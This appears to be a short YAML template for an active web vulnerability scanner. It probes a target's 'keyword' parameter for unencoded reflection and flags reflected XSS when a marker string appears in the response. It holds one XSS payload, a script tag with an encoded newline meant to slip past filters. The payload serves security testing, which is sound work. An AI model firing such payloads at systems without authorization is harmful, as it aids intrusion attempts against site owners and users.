id: xss5-3644
name: 'Raw XSS5 in keyword'
severity: high
type: active
tags:
  - xss
  - injection
  - client
description: 'Unencoded reflection in keyword'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      keyword:
        - '<script%0a>alert(nx53643)</script>'
    matchers:
      - type: word
        part: body
        words:
          - 'nx53643'
